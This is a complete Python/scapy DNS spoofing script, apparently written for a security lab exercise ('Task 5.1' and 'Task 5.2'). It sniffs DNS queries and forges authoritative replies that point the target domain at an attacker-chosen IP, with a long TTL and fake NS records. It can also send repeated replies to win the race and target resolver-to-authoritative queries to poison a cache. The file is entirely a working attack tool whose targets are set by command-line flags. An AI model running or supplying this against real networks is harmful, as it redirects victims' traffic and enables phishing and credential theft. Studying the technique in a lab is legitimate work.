#!/usr/bin/env python3
"""DNS spoofing helper for Task 5.1

Usage examples (see README / instructions provided separately):
  sudo python3 dns_sniff_spoof.py --iface br-xxxx --domain www.example.net --spoof-ip 10.0.2.5

This script listens for DNS queries and sends a spoofed DNS reply when the
queried name matches the target domain.
"""

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send, conf
import argparse
import logging
import sys


def make_spoof_handler(target_domain: str, spoof_ip: str, retries: int = 1):
  target_domain = target_domain.rstrip('.').lower()

  def _handler(pkt):
    try:
      if DNS not in pkt:
        return
      # Ensure there's a question
      if not hasattr(pkt[DNS], 'qd') or pkt[DNS].qd is None:
        return

      qname = pkt[DNS].qd.qname.decode('utf-8').rstrip('.').lower()

      # Match exact, subdomain, or if the target string appears anywhere
      # in the queried name. This makes the tool tolerant of CNAMEs like
      # "www.example.net-v2.edgesuite.net" that can appear in practice
      # during resolution.
      if target_domain not in qname:
        return

      logging.info('Matched DNS query for %s from %s', qname, pkt[IP].src)

      # Build spoofed packet: swap src/dst IP and ports, set DNS flags to response
      ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
      udp = UDP(dport=pkt[UDP].sport, sport=53)

      ans = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata=spoof_ip)

      # Authority / Additional sections are optional; keep similar to original
      ns1 = DNSRR(rrname=target_domain, type='NS', ttl=259200, rdata='ns1.' + target_domain)
      ns2 = DNSRR(rrname=target_domain, type='NS', ttl=259200, rdata='ns2.' + target_domain)
      add1 = DNSRR(rrname='ns1.' + target_domain, type='A', ttl=259200, rdata='1.2.3.4')
      add2 = DNSRR(rrname='ns2.' + target_domain, type='A', ttl=259200, rdata='5.6.7.8')

      dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
            qdcount=1, ancount=1, nscount=2, arcount=2,
            an=ans, ns=ns1/ns2, ar=add1/add2)

      spoof = ip/udp/dns
      
      # Send multiple copies to increase chance of winning race
      for i in range(retries):
        send(spoof, verbose=False)
      
      if retries > 1:
        logging.info('Sent %d spoofed replies %s -> %s', retries, spoof_ip, pkt[IP].src)
      else:
        logging.info('Sent spoofed reply %s -> %s', spoof_ip, pkt[IP].src)

    except Exception:
      logging.exception('Error handling packet')

  return _handler


def parse_args():
  p = argparse.ArgumentParser(description='Simple DNS spoofing helper for Task 5.1')
  p.add_argument('--iface', '-i', default=None, help='Interface to sniff on (default: scapy default)')
  p.add_argument('--domain', '-d', default='www.example.net', help='Domain to spoof (default: www.example.net)')
  p.add_argument('--spoof-ip', '-s', default='10.0.2.5', help='IP address to return in spoofed replies')
  p.add_argument('--retries', '-r', type=int, default=1, help='Number of spoofed replies to send per match (default: 1)')
  p.add_argument('--filter', default='udp and dst port 53', help='BPF filter for sniff (default: "udp and dst port 53")')
  p.add_argument('--target-resolver', action='store_true', help='Target resolver->authoritative queries instead of user->resolver (changes filter)')
  return p.parse_args()


def main():
  args = parse_args()

  logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

  # Determine which interface to use
  iface = args.iface if args.iface else conf.iface
  logging.info('Using interface: %s', iface)

  # Adjust filter if targeting resolver->authoritative queries
  bpf_filter = args.filter
  if args.target_resolver:
    # For Task 5.2: catch queries FROM the resolver TO authoritative servers
    bpf_filter = 'udp and src host 10.9.0.53 and dst port 53'
    logging.info('Targeting resolver->authoritative queries (Task 5.2 mode)')
  
  logging.info('BPF filter: %s', bpf_filter)

  handler = make_spoof_handler(args.domain, args.spoof_ip, args.retries)

  logging.info('Listening for DNS queries matching "%s" and spoofing with %s', args.domain, args.spoof_ip)
  if args.retries > 1:
    logging.info('Sending %d spoofed replies per match', args.retries)

  try:
    # CRITICAL: pass iface= explicitly to sniff() - setting conf.iface alone doesn't always work in containers
    sniff(iface=iface, filter=bpf_filter, prn=handler, store=0)
  except KeyboardInterrupt:
    logging.info('Interrupted by user, exiting')
    sys.exit(0)


if __name__ == '__main__':
  main()
